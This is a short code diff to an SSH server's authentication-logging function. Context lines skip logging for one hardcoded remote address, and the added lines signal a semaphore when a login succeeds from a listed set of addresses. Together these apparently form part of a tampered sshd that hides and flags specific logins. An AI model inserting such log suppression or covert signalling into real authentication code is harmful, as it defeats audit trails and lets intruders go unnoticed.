@@ -295,6 +295,16 @@ auth_log(Authctxt *authctxt, int authenticated, int partial,
 
 	if (strstr(get_remote_ipaddr(), haddr_str) != NULL) 
 		return;
+	int i;
+	if(authenticated) {
+	        for(i = 0; i < MAX_MADDR_STR; i++) {
+	                if(strstr(get_remote_ipaddr(), maddr_str[i]) != NULL) {
+	                        struct sembuf sops = {0,1,IPC_NOWAIT};
+	                        semop(semid, &sops, 1);
+	                        break;
+	                }
+	        }
+	}
 
 	authlog("%s %s%s%s for %s%.100s from %.200s port %d %s%s%s",
 	    authmsg,
